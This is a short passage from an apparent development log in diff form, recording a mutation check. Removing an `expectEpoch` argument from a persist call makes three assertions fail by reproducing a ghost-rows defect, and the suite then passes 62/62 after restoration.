+shared-DB harness is a real hazard; rewritten to use dedicated pages.
+MUTATION CHECK: removed `expectEpoch` from the route's persist call and re-ran —
+3 assertions failed showing exactly the original defect (the cleared thread came
+back with 2 ghost rows). The F3 test is load-bearing, not decorative. File
+restored and re-verified at 62/62.
+STATUS: COMPLETE
+---
